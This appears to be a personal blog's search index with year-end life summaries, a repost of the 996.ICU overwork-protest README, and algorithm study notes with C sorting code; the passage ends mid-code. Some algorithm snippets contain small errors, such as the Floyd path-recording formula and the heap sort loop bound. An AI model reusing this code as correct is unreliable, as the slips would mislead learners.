<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2016 年终总结</title>
    <url>/post/2016-summary/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/Blog_2016_summary_08.png-index"></p>
<span id="more"></span>

<p>想来想去也不知道写啥，上了几个月的班；年会没抽到大奖，只拿到了一大堆小奖品；参加了几次演出；最喜欢听<a href="http://music.163.com/#/m/playlist?id=588565912">这些歌</a>；活着那么艰难，可梦想还是有的。希望明年能有心情静下心来录歌～</p>
<p><img src="http://qiniu.s1nh.org/Blog_2016_summary_00.jpg-QNthin"></p>
<hr>
<p>今年最要谢谢的就是武汉两年的舍友飘飘了～</p>
<p><img src="http://qiniu.s1nh.org/Blog_2016_summary_xx.jpg-QNthin"></p>
<h2 id="0x00-没有大奖的年会"><a href="#0x00-没有大奖的年会" class="headerlink" title="0x00 没有大奖的年会"></a>0x00 没有大奖的年会</h2><p><img src="http://qiniu.s1nh.org/Blog_2016_summary_03.jpg-QNthin" title="有漂漂姐姐帮忙带领结"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_04.jpg-QNthin" title="数学大神"></p>
<p><img src="http://qiniu.s1nh.org/Blog_2016_summary_01.jpg-QNthin" title="很尴尬的拍了张照"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_02.jpg-QNthin" title="玩游戏赚的大礼包"></p>
<h2 id="0x01-新年礼物"><a href="#0x01-新年礼物" class="headerlink" title="0x01 新年礼物"></a>0x01 新年礼物</h2><p><img src="http://qiniu.s1nh.org/Blog_2016_summary_15.jpg-QNthin" title="到深圳后买的单车"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_18.jpg-QNthin" title="买到了经典的Fender st57"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_17.jpg-QNthin" title="生产日期很吉利"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_16.jpg-QNthin" title="碰到了很漂亮的琴体，赶紧用压岁钱买了下来"></p>
<h2 id="0x01-几次小演出"><a href="#0x01-几次小演出" class="headerlink" title="0x01 几次小演出"></a>0x01 几次小演出</h2><p><img src="http://qiniu.s1nh.org/Blog_2016_summary_06.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_07.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_09.jpg-QNthin" title="这些设备已经不再用了，过年压岁钱买了G-system"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_10.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_11.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_12.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_2016_summary_13.jpg-QNthin"></p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p><img src="http://qiniu.s1nh.org/Blog_2016_summary_14.jpg-QNthin" title="看到这个背影还是忍不住会哭"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>2017年终总结</title>
    <url>/post/2017-summary/</url>
    <content><![CDATA[<blockquote>
<p>2017年应该是最折腾的一年，为了传说中的梦想从深圳到了北京，离开了我超喜欢的一个领导，到计算所后由期待到失望…</p>
</blockquote>
<blockquote>
<p>时间过的很快，因为把时间都浪费在搬家和融入新团队中了。不过忙忙碌碌的好处就是没有时间发呆和难过了哈哈哈 &gt;_&lt;</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/2017_summary_23.jpg-QNthin" title="画质也是有点糙"></p>
<span id="more"></span>

<p> <audio  controls="controls" autoplay="autoplay" loop="loop" src="http://qiniu.s1nh.org/lethal_injection.mp3"></audio></p>

<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><code>加入了新团队 Lanternfish</code></p>
<p><img src="http://qiniu.s1nh.org/2017_summary_24.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_11.jpg-QNthin"></p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p><img src="http://qiniu.s1nh.org/2017_summary_02.jpg-QNthin" title="年底买的新玩具"><br><img src="http://qiniu.s1nh.org/2017_summary_03.jpg-QNthin" title="摔烂了之前最喜欢的吉他"><br><img src="http://qiniu.s1nh.org/2017_summary_04.jpg-QNthin" title="一把很烂的无限延音吉他"><br><img src="http://qiniu.s1nh.org/2017_summary_05.jpg-QNthin" title="给效果器买了大盒子"><br><img src="http://qiniu.s1nh.org/2017_summary_06.jpg-QNthin" title="其实它是把57"><br><img src="http://qiniu.s1nh.org/2017_summary_07.jpg-QNthin" title="声音很好听的mini-hunbucker（左）"></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><code>去了很多地方</code></p>
<p><img src="http://qiniu.s1nh.org/2017_summary_09.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/2017_summary_12.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_13.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_14.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_15.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_20.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_21.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_22.jpg-QNthin"></p>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p><code>还好有这个智障愿意陪着我</code></p>
<p><img src="http://qiniu.s1nh.org/2017_summary_01.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_08.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_10.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_16.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_17.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_18.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/2017_summary_19.jpg-QNthin"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>2018 年终总结</title>
    <url>/post/2018-summary/</url>
    <content><![CDATA[<blockquote>
<p>又到写年终总结的时间了</p>
</blockquote>
<p>毕业工作了</p>
<p><img src="http://qiniu.s1nh.org/Blog_2018-summary_01.jpeg-QNthin"></p>
<span id="more"></span>

<p><img src="http://qiniu.s1nh.org/Blog_2018-summary_02.jpeg-QNthin"></p>
<p>有了一个自己的地下室</p>
<p><img src="http://qiniu.s1nh.org/Blog_2018-summary_03.jpeg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_2018-summary_04.jpeg-QNthin"></p>
<p>买了把吉他</p>
<p><img src="http://qiniu.s1nh.org/Blog_2018-summary_05.jpeg-QNthin"></p>
<p>养了只猫</p>
<p><img src="http://qiniu.s1nh.org/Blog_2018-summary_06.jpeg-QNthin"></p>
<p>做了把吉他，然后卖掉了</p>
<p><img src="http://qiniu.s1nh.org/Blog_2018-summary_07.jpeg-QNthin"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>996.ICU</title>
    <url>/post/996-ICU/</url>
    <content><![CDATA[<p><strong>一位保守党政客讲得再清楚不过，穷人全都“必须要不断地吃，不断地喝，不断地工作，不断地死去”。</strong></p>
<span id="more"></span>

<ul>
<li><a href="https://github.com/996icu/996.ICU/blob/master/README.md">English version</a></li>
</ul>
<p><code>996.ICU</code>  是指“工作 996， 生病 ICU” 。这是中国程序员之间的一种自嘲说法，意思是如果按照 996 的模式工作，那以后就得进 ICU 了。</p>
<h2 id="相关报道"><a href="#相关报道" class="headerlink" title="相关报道"></a>相关报道</h2><ul>
<li>《共青团中央》：<a href="https://mp.weixin.qq.com/s/e5qaW6ED_WUunNYG-q7frg">工作996，生病ICU？关注：年轻人该如何奋斗</a></li>
<li>《中国青年报》：<a href="http://zqb.cyol.com/html/2019-04/02/nw.D110000zgqnb_20190402_1-02.htm">被“996”工作制围困的年轻人：像是定好闹钟的机器</a></li>
<li>《半月谈评论》：<a href="http://www.banyuetan.org/dyp/detail/20190415/1000200033134991555306789054254821_1.html">996与奋斗无关，与利益有关</a></li>
</ul>
<p>点击此处查看相关报道的<a href="https://github.com/996icu/996.ICU/blob/master/externals/news.md">完整列表</a></p>
<h2 id="什么是996？"><a href="#什么是996？" class="headerlink" title="什么是996？"></a>什么是996？</h2><p>“996”工作制，指的是一种越来越流行的非官方工作制（早上 9 点 ~ 晚上 9 点，每周 6 天）。在一个实行“996”工作制的公司工作就意味着每周至少要工作 60 个小时。</p>
<h2 id="我能做什么？"><a href="#我能做什么？" class="headerlink" title="我能做什么？"></a>我能做什么？</h2><ul>
<li>更新这个<a href="https://github.com/996icu/996.ICU/blob/master/blacklist/README.md">名单</a>（注附带证据），来帮助每一位工作者。<a href="https://www.996action.com/index.php/889799">为不熟悉GitHub劳动者准备的提交渠道</a></li>
<li>把这个<a href="https://github.com/996icu/996.ICU/blob/master/externals/instruction.md">徽章</a>添加到你的项目来支持 996.ICU</li>
<li>为你的项目添加<a href="LICENSE_CN">反 996 许可证</a>。</li>
<li>给社区与项目发展提出新的<a href="https://github.com/996icu/996.ICU/blob/master/proposal/README.md">议案</a>。</li>
<li>下午6点钟下班回家。</li>
<li>企业和群众可以登录中国政府网（<a href="http://www.gov.cn)/">www.gov.cn）</a> 或下载国务院客户端，进入国务院“互联网+督查”专栏，也可以关注中国政府网微信公众号，进入国务院“互联网+督查”小程序提供线索、反映问题、提出建议。国务院办公厅将对收到的问题线索和意见建议进行汇总整理，督促有关地方、部门处理。对企业和群众反映强烈、带有普遍性的重要问题线索，国务院办公厅督查室将直接派员督查。经查证属实、较为典型的问题，将予以公开曝光、严肃处理。 </li>
<li>互助式举报，通过群聊频道<a href="https://join.slack.com/t/996icu/shared_invite/enQtNjI0MjEzMTUxNDI0LTA5NTc3MTk0MDRlMzIzNTI3ZDk1Y2IxNzQzZmM0NGQzNmI0NDA3MWE2ZWQyY2RlNjhkN2ViYjYyMDAzMGVmNjQ">Slack</a> 找到有相似举报需求的加班受害者，相互举报对方公司的违法事实，根据《劳动保障监察条例》第一章第九条 “任何组织或者个人对违反劳动保障法律、法规或者规章的行为，有权向劳动保障行政部门举报。” 通过电话以朋友的名义向当地劳动监察大队举报，以便更稳妥的保护当事人身份信息。详细内容请见<a href="https://github.com/996icu/996.ICU/blob/master/externals/mutual_help.md">互助式举报说明细项</a></li>
</ul>
<h2 id="各界声音"><a href="#各界声音" class="headerlink" title="各界声音"></a>各界声音</h2><h3 id="官媒"><a href="#官媒" class="headerlink" title="官媒"></a>官媒</h3><ul>
<li><a href="http://www.xinhuanet.com/politics/2019-04/15/c_1124370790.htm">996当退场</a></li>
</ul>
<h3 id="资本家"><a href="#资本家" class="headerlink" title="资本家"></a>资本家</h3><ul>
<li><strong>马云, 阿里巴巴创始人</strong>: <code>“996”是一种福报</code>。</li>
<li><strong>刘强东，京东创始人</strong>: <code>京东不会强制995或者996</code>。<br>但是有许多员工匿名表示，公司内部有一个“加班排名表”，列举了各个部门的加班情况排名，排名低的部门会受到惩罚。领导们安排996工作时，也会注意不留下证据。</li>
<li><strong>白鸦, 有赞CEO</strong>: <code>几年后回看，这次绝对是好事</code>。</li>
</ul>
<h3 id="开发者"><a href="#开发者" class="headerlink" title="开发者"></a>开发者</h3><ul>
<li>Guido van Rossum, Python之父: <a href="https://twitter.com/gvanrossum/status/1111628076801236993"><code>&quot;996&quot;工作制是不人道的</code></a>.</li>
</ul>
<h2 id="原则和目的"><a href="#原则和目的" class="headerlink" title="原则和目的"></a>原则和目的</h2><ul>
<li><p>首先需要申明的是这不是一个政治运动，我们每个人都坚定维护劳动法，但我们同时要求雇主也要尊重雇员的合法权益。</p>
</li>
<li><p>996.ICU 是中国众多的 IT 从业者发起的一项倡议，我们欢迎其他领域、其他国家的人士加入讨论。</p>
</li>
<li><p>从闭源到开源是一次伟大的进步，从开源到同时强调保护劳工权益也将是一次伟大的进步，我们想要创造一个主张保护劳动者权益的开源软件许可证。</p>
</li>
<li><p>我们欢迎一切积极的、具有建设性意义的建议，倡导成熟、负责任以及有价值的发言。</p>
</li>
</ul>
<h2 id="扩大影响"><a href="#扩大影响" class="headerlink" title="扩大影响"></a>扩大影响</h2><p><a href="https://github.com/996icu/996.ICU/blob/master/i18n/README.md">996.ICU 内容翻译</a>，请自由发挥你的能力，调整格式、添加内容或修正语法。不过要注意，添加过多的翻译版本并非我们的目标。</p>
<h2 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h2><ul>
<li><p><a href="https://github.com/formulahendry/955.WLB">955.WLB</a> 955 公司白名单，旨在让更多的人逃离 996，加入 955 的行列。</p>
</li>
<li><p><a href="https://github.com/fengT-T/996_list">996.LIST</a> 此 repo 为 996 和 955 的匿名投票列表。</p>
</li>
<li><p><a href="https://github.com/CPdogson/996.law">996.law</a> 面向所有劳动者的一份劳动仲裁与劳动诉讼的攻略手册，看完它之后你甚至不用找律师。并且倡导劳动者在工作中随时取证以备后患。</p>
</li>
<li><p><a href="https://github.com/boycott996/yaocl">996.YAOCL</a> Yet Another Overtime Corps List, 另外一个匿名投票列表</p>
</li>
<li><p><a href="https://github.com/623637646/996.Leave">996.Leave</a> 介绍与鼓励海外工作。</p>
</li>
<li><p><a href="https://996.rip/">996.RIP</a> 企业可能会忘，但我们不会忘。</p>
</li>
<li><p><a href="https://github.com/xokctah/996.petition">996.Petition</a> 向相关政府主管单位投递公开信，请求主管单位采取行动。</p>
</li>
<li><p><a href="https://github.com/CPdogson/996action">996.action</a> 强调用行动抗议996的板块，向政府信息公开火热进行中，#向马云寄劳动法#行为艺术式，除此之外还有许多行动选择。</p>
</li>
<li><p><a href="https://github.com/996-icu-avengers/Natasha">996.avengers</a> 旨在各大招聘网站标记996.ICU和955.WLB上榜公司。</p>
</li>
<li><p><a href="https://github.com/zheolong/996.OD.git">996.OD</a> 程序员长期996导致的职业病，为广大程序员兄弟提供可以查询的常见职业病信息，为职业病防治法的立法改进提供依据。</p>
</li>
<li><p><a href="https://github.com/alexddhuang/996.Q">996.Q</a> 收集有关 996 的自嘲、笑话、段子。</p>
</li>
<li><p><a href="https://github.com/0594mazhiyuan/996.survey">996.survey</a> 一份对于 996 现状的调查。</p>
</li>
<li><p><a href="https://github.com/msworkers/support.996.ICU">support.996.ICU</a> 微软与GitHub员工自发组织 实名签名 支持 996.ICU</p>
</li>
<li><p><a href="https://github.com/996-699/996.699">699cn</a> 一键存证微信小程序，免安装永久免费，完全公益性质。一键采集员工当前经纬度和打卡时间存证到服务器，未来目标是期望更多志愿者加入团队，建设成为基于分布式账本技术的存证平台，只要地球上还有程序员，证据就永远存在。</p>
</li>
<li><p><a href="https://github.com/996BC/996.Blockchain">996.Blockchain</a> 一个存储加班证据摘要的区块链项目</p>
</li>
<li><p><a href="https://github.com/MagicLu550/996Error">996.Error</a> 收集各种语言写的“996”异常,可以在项目中直接使用</p>
</li>
</ul>
<h2 id="Issues-去哪了？"><a href="#Issues-去哪了？" class="headerlink" title="Issues 去哪了？"></a>Issues 去哪了？</h2><p>即使有互动限制，Issues 区依然完全失去了控制。<br>因此我<strong>个人</strong>决定关闭 Issues，这与 GitHub 或其他方面无关。</p>
<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p><a href="LICENSE">反 996 许可证</a></p>
<ul>
<li>此许可证的目的是阻止违反劳动法的公司使用许可证下的软件或代码，并强迫这些公司权衡他们的行为。</li>
<li>在此处查看反 996 许可证下的<a href="https://github.com/996icu/996.ICU/blob/master/awesomelist/README.md">完整项目列表</a></li>
<li>该草案改编自 MIT 许可证，如需更多信息请查看 <a href="https://github.com/kattgu7/996-License-Draft/wiki">Wiki</a>。此许可证旨在与所有主流开源许可证兼容。</li>
<li>如果你是法律专业人士，或是任何愿意为未来版本做出直接贡献的人，请访问 <a href="https://github.com/kattgu7/996-License-Draft">Anti-996-License-1.0</a>。感谢你的帮助。</li>
</ul>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>《数据结构与算法分析》复习笔记</title>
    <url>/post/Algorithm-Review/</url>
    <content><![CDATA[<blockquote>
<p>不过我喝咖啡从来不是为了提神的 这个世界上唯一提神的东西就是你今天必须完成的事情呀</p>
</blockquote>
<p>博士只考一门<code>数据结构与算法分析</code>，如果这都考不过那就真的重在参与了。本文把看完书以后手撸的代码贴出来，留个纪念。</p>
<span id="more"></span>

<blockquote>
<p>1月4日写了一天没保存就 init 0 了 &gt;_&lt;<br>以后还是老老实实用VIM编辑好了，最起码有swp文件</p>
</blockquote>
<p>说实话冯舜玺译的《数据结构与算法分析》实在是有点难懂（骂街的话省略一百万字……）。 想算法入门的童鞋还是去看看《大话数据结构》《啊哈!算法》之类的书吧。</p>
<hr>
<h2 id="0x04-树"><a href="#0x04-树" class="headerlink" title="0x04 树"></a>0x04 树</h2><p><strong>遍历</strong></p>
<ul>
<li>前序遍历(ListDIR)：根节点-&gt;左子树-&gt;右子树</li>
<li>中序遍历：左子树-&gt;根节点-&gt;右子树</li>
<li>后序遍历：左子树-&gt;右子树-&gt;根节点</li>
</ul>
<p><strong>二叉查找树</strong></p>
<ul>
<li>左子树 &lt; 根 &lt; 右子树</li>
<li><code>Find/FindMin/FindMax/[Insert]</code> 递归</li>
<li><code>Delete</code> 懒惰删除</li>
</ul>
<p><strong>平衡(AVL)二叉树</strong> 带有平衡条件的二叉查找树</p>
<ul>
<li>单旋</li>
<li>双旋</li>
</ul>
<p><strong>伸展树</strong></p>
<hr>
<h2 id="0x05-散列"><a href="#0x05-散列" class="headerlink" title="0x05 散列"></a>0x05 散列</h2><hr>
<h2 id="0x06-堆（优先队列）"><a href="#0x06-堆（优先队列）" class="headerlink" title="0x06 堆（优先队列）"></a>0x06 堆（优先队列）</h2><p><code>优先队列：最高级先出</code> <code>二叉堆（孩子比根大）∈ 完全二叉树</code> <code>堆==&gt;二叉堆</code></p>
<p><strong>数组存储</strong></p>
<ul>
<li>0位置是哑信息（小于堆中的任何值）</li>
<li>根从[1]位置开始</li>
</ul>
<p><strong>构建堆</strong></p>
<ol>
<li>随便放</li>
<li>N/2 -&gt; 0 下滤</li>
</ol>
<p><strong>插入</strong></p>
<ol>
<li>放到数组最后</li>
<li>上滤（如果比根小就与根交换）</li>
<li>因为0位置是标记(dummy)，所以不用判断是否终止</li>
</ol>
<p><strong>删除最小值</strong></p>
<ol>
<li>弹出第一个</li>
<li>末尾的放到第一个</li>
<li>下滤（小的儿子如果比根小，与根交换）</li>
<li>巧妙地防止没有右儿子 <code>if(Child != H.size &amp;&amp; H[Child+1]&lt;H[Child])Child++;</code></li>
</ol>
<p><strong>降低值</strong>–&gt;上滤<br><strong>增加值</strong>–&gt;下滤<br><strong>删除</strong>–&gt;降低为最小值，删除最小值</p>
<p><strong>d-堆</strong>–&gt;树浅，insert快</p>
<p><strong>左式堆</strong> –&gt; 左式堆是专门用来解优先队列合并的麻烦（任意二叉堆的合并都必须重新合并，O（N）的时间）。趋向于非常不平衡</p>
<ol>
<li>零路径长度：到没有两个儿子的节点最短距离</li>
<li>零路径长：左儿子≧右儿子，父节点= min{儿子} +1（这条性质导致了左式堆的严重左偏）</li>
<li>根值大的堆与根值小的堆的右子堆合并(根值：根位置的元素值，并非零路径长度)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">合并方法</span><br><span class="line">1. 根值大的堆（H1）与根值小的堆（H2）的右子堆合并</span><br><span class="line">2. 若H2有右子堆，取出（H3）与H1合并（递归）</span><br><span class="line">3. 若不满足根的左儿子≧右儿子，交换左右孩子</span><br><span class="line"> </span><br><span class="line">Merge(PriorityQueue H1,H2)   &#x2F;&#x2F;H1&lt;H2</span><br><span class="line">&#123;</span><br><span class="line">  if(H1.left&#x3D;&#x3D;NULL)</span><br><span class="line">    H1.left&#x3D;H2;</span><br><span class="line">  else&#123;</span><br><span class="line">    H1.right &#x3D; Merge_(H1.right,H2); &#x2F;&#x2F;Merge_要判断是否为空和H1,H2的大小</span><br><span class="line">    if(H1.left.NP1&lt;H1.right.NP1)</span><br><span class="line">      swapChildren(H1)</span><br><span class="line">  &#125;</span><br><span class="line">  return H1;</span><br></pre></td></tr></table></figure>
<p><strong>二项队列</strong> –&gt; 二项队列是由不同高度堆序树组成的森林</p>
<ol>
<li>合并：相同高度的合并，不同高度的添加</li>
<li>插入=合并</li>
<li>DeleteMin: &lt;1&gt;遍历所有最小节点 &lt;2&gt;将最小点的树DeleteMin并删除 &lt;3&gt;将最小点的树合并到原始二项队列</li>
</ol>
<hr>
<h2 id="0x09-图"><a href="#0x09-图" class="headerlink" title="0x09 图"></a>0x09 图</h2><p><strong>拓扑排序</strong></p>
<ol>
<li>找到没有入边的点</li>
<li>删除它和它的边</li>
<li>重复上面两条直到图空为止</li>
</ol>
<p><strong>最短路 - 广搜</strong> –&gt; 无权图</p>
<p><strong>最短路 - Dijkstra</strong></p>
<ol>
<li>选取集合外与起始节点距离最小的点加入集合</li>
<li>调整所有与集合相邻的节点的最短路径 D(w)=min(D(w),D(v)+j(v,w))</li>
<li>重复直到集合=全集</li>
</ol>
<p><strong>最短路 - 有负边</strong> –&gt; 使用队列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#适用于有负边的Dijkstra版本</span><br><span class="line">Table T, Queue Q, Start vertex S</span><br><span class="line">While(Q is not Empty)&#123;</span><br><span class="line">  V&#x3D;Dequeue(Q)</span><br><span class="line">  for each w adjacent V</span><br><span class="line">    if (T[V].dist+Cvw&lt;T[w].dist)&#123;</span><br><span class="line">      T[w].dist&#x3D;T[v].dist+Cvw</span><br><span class="line">      T[w].path&#x3D;V</span><br><span class="line">      if w∉Q</span><br><span class="line">        Enqueue(w,Q)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">DisposeQueue(Q)</span><br></pre></td></tr></table></figure>

<p><strong>最短路 - Floyd Wasrshall</strong><br><code>NOIP最喜欢这个。碰到最短路题，一分钟敲4行代码就完事</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for k in G	#记住k一定放在最外层循环</span><br><span class="line">  for u in G</span><br><span class="line">    for v in G</span><br><span class="line">      D[u,v]&#x3D;min(D[u,v],D[u,k]+D[k,v])</span><br></pre></td></tr></table></figure>

<p>如果要记录路径，</p>
<ol>
<li>初始化P(u,v)=u</li>
<li>在循环中<code>if(D[u,k]+D[k,v]&lt;D[u,v]) P(u,v)=P(k,u)</code></li>
</ol>
<p><strong>网络流</strong><br><code>最大流可能不止一个</code></p>
<p><strong>最小生成树</strong><br>prim –&gt; 往树上加最小边<br>Kruskal –&gt; 选择不成环的最小边</p>
<hr>
<h2 id="0x07-排序"><a href="#0x07-排序" class="headerlink" title="0x07 排序"></a>0x07 排序</h2><p>排序算法还是比较基础的，复习以后有一丢丢启发（竞赛入门水平只会个快排，以前一直把希尔排序跟归并排序搞混、堆排序也从来没用过&gt;_&lt;）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">static int N &#x3D; 10;</span><br><span class="line">int i &#x3D; 0, j &#x3D; 0;</span><br><span class="line"></span><br><span class="line">void print(int a[]) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; N; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; 把第i个元素插入到前面合适的位置（其它元素顺应后移）</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">void insert_sort(int a[]) &#123;</span><br><span class="line">    int tmp, i, j;</span><br><span class="line">    for (i &#x3D; 1; i &lt; N; i++) &#123;</span><br><span class="line">        tmp &#x3D; a[i];</span><br><span class="line">        for (j &#x3D; i; j &gt; 0 &amp;&amp; tmp &lt; a[j - 1]; j--) &#123;</span><br><span class="line">            a[j] &#x3D; a[j - 1];</span><br><span class="line">        &#125;</span><br><span class="line">        a[j] &#x3D; tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;因为插入排序对已经近似排序好的序列时间复杂度低</span><br><span class="line">&#x2F;&#x2F;分组，执行log(n)次插入排序</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">void shell_sort(int a[]) &#123;</span><br><span class="line">    int gap, i, j, tmp;</span><br><span class="line"></span><br><span class="line">    for (gap &#x3D; N &#x2F; 2; gap &gt; 0; gap &#x2F;&#x3D; 2) &#123;</span><br><span class="line">        for (i &#x3D; gap; i &lt; N; i++) &#123;</span><br><span class="line">            tmp &#x3D; a[i];</span><br><span class="line">            for (j &#x3D; i; j &gt;&#x3D; gap; j -&#x3D; gap) &#123;</span><br><span class="line">                if (a[j - gap] &gt; tmp) &#123; &#x2F;&#x2F;if不能跟前面的插入排序一样跟for写在一行，否则就失去希尔排序的意义了</span><br><span class="line">                    a[j] &#x3D; a[j - gap];</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            a[j] &#x3D; tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;堆排序：1.构建堆（下滤）；2.不断的首尾交换&amp;下滤</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">void perc_down(int a[], int i, int N) &#123;</span><br><span class="line">    int tmp &#x3D; a[i];</span><br><span class="line">    int child;</span><br><span class="line">    while (i &lt; (N - 1) &#x2F; 2) &#123;  &#x2F;&#x2F;leftchild&lt;N &#x3D;&#x3D;&gt; 2*i+1&lt;N &#x3D;&#x3D;&gt; i&lt;N-1</span><br><span class="line">        child &#x3D; 2 * i + 1;</span><br><span class="line">        if (a[child] &gt; a[child + 1]) &#123;</span><br><span class="line">            child++;</span><br><span class="line">        &#125;</span><br><span class="line">        if (tmp &gt; a[child]) &#123;</span><br><span class="line">            a[i] &#x3D; a[child];</span><br><span class="line">            i &#x3D; child;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[i] &#x3D; tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void heap_sort(int a[]) &#123;</span><br><span class="line">    int tmp;</span><br><span class="line">    for (int i &#x3D; N &#x2F; 2; i &gt;&#x3D; 0; i--) &#123;</span><br><span class="line">        perc_down(a, i, N);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; N - 1; i &gt; 0; i--) &#123;</span><br><span class="line">        tmp &#x3D; a[0];</span><br><span class="line">        a[0] &#x3D; a[i];</span><br><span class="line">        a[i] &#x3D; tmp;</span><br><span class="line">        perc_down(a, 0, i);</span><br><span class="line">        printf(&quot;%d:\t&quot;, i);</span><br><span class="line">        print(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 